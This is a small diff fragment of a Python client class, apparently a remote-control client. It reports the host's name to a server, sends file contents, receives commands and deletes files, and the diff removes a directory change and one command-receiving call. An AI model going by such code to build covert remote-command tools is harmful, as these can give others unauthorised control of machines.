@@ -310,7 +310,6 @@ class Client(object):
             send_data(Encrypted_Signature)
 
             self.send(socket.gethostname().encode())
-            os.chdir(os.path.dirname(sys.argv[0]))
         except Exception as e:
             logging.error(errors(e))
 
@@ -508,7 +507,6 @@ class Client(object):
                     self.send(errors(e).encode())
                     continue
                 self.send(_file.encode())
-                self.receive_commands()
                 os.remove(_file)
                 continue
 
